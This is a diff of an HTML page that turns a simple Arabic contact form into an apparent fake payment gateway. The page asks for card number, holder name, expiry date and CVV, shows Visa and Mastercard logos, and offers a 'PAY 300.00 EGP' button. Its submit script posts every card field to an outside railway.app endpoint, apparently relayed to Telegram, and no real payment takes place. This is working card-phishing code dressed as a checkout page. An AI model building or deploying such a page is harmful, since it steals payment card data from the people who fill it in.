@@ -3,40 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إرسال البيانات إلى تليجرام</title>
+    <title>بوابة الدفع</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+        }
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background: white;
+            margin: 50px auto;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .card {
+            background: #0074D9;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: left;
+            position: relative;
+        }
+        .card input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            color: white;
+            font-size: 16px;
+        }
+        .card input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+        .form-group {
+            text-align: left;
+            margin: 15px 0;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .pay-btn {
+            width: 100%;
+            background: #0074D9;
+            color: white;
+            border: none;
+            padding: 15px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .pay-btn:hover {
+            background: #005bb5;
+        }
+        .logos {
+            margin-top: 10px;
+        }
+    </style>
 </head>
 <body>
-    <h2>أدخل بياناتك</h2>
-    <form id="dataForm">
-        <label>الاسم:</label>
-        <input type="text" id="name" required><br><br>
 
-        <label>رقم الهاتف:</label>
-        <input type="text" id="phone" required><br><br>
+    <div class="container">
+        <h2>Payment Information</h2>
+        <div class="card">
+            <p>Card Number</p>
+            <input type="text" id="cardNumber" placeholder="Enter Number" required>
+        </div>
 
-        <label>الرسالة:</label>
-        <textarea id="message" required></textarea><br><br>
+        <form id="paymentForm">
+            <div class="form-group">
+                <label>Card Holder Name:</label>
+                <input type="text" id="name" placeholder="Enter Name" required>
+            </div>
 
-        <button type="submit">إرسال</button>
-    </form>
+            <div class="form-group">
+                <label>Expiration Date:</label>
+                <input type="text" id="expiry" placeholder="MM/YY" required>
+            </div>
+
+            <div class="form-group">
+                <label>CVV:</label>
+                <input type="text" id="cvv" placeholder="CVV" required>
+            </div>
+
+            <button type="submit" class="pay-btn">PAY 300.00 EGP</button>
+        </form>
+
+        <div class="logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Visa.svg/120px-Visa.svg.png" alt="Visa" width="40">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/120px-Mastercard-logo.svg.png" alt="MasterCard" width="40">
+        </div>
+    </div>
 
     <script>
-        document.getElementById("dataForm").addEventListener("submit", function(event) {
+        document.getElementById("paymentForm").addEventListener("submit", function(event) {
             event.preventDefault();
 
+            const cardNumber = document.getElementById("cardNumber").value;
             const name = document.getElementById("name").value;
-            const phone = document.getElementById("phone").value;
-            const message = document.getElementById("message").value;
+            const expiry = document.getElementById("expiry").value;
+            const cvv = document.getElementById("cvv").value;
 
             fetch("https://nodejs-production-7090.up.railway.app/send", { 
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ name, phone, message })
+                body: JSON.stringify({ cardNumber, name, expiry, cvv })
             })
             .then(response => response.json())
             .then(data => alert(data.message))
             .catch(error => alert("حدث خطأ!"));
         });
     </script>
+
 </body>
 </html>
